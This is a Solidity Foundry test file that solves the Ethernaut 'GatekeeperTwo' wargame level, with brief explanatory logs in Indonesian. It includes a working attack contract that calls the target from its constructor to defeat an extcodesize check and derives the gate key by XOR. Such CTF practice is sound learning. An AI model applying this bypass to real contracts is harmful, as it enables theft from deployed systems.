// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "../Ethernaut.sol";
import "../15-GatekeeperTwo/GatekeeperTwoFactory.sol";

contract GatekeeperTwoAttack is Test {
    function testGatekeeperTwo() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address kiper = makeAddr("kiper");
        Ethernaut ethernaut = new Ethernaut();
        GatekeeperTwoFactory factory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(kiper, kiper);
        address addr = ethernaut.createLevelInstance(factory);
        GatekeeperTwo gate = GatekeeperTwo(addr);
        bool bukanEntrant = gate.entrant() != kiper;
        assertTrue(bukanEntrant);
        emit log("setup done!\nGoal: Entrant haruslah tx.origin");
        emit log("gateOne mengaharuskan memanggil fungsi menggunakan kontrak lain");
        emit log(
            "sizecode EOA adalah  0, sedangkan contract > 0, tetapi ketika contract baru dideploy, sizecode nya 0."
        );
        emit log("dengan kata lain, gateTwo dapat dilewati jika memanggil fungsi pada constructor");
        emit log("a ^ b = c, sama saja dengan a ^ c = b");
        GateKey key = new GateKey(address(gate));
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract GateKey {
    GatekeeperTwo gate;

    constructor(address _gate) {
        gate = GatekeeperTwo(_gate);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gate.enter(key);
    }
}
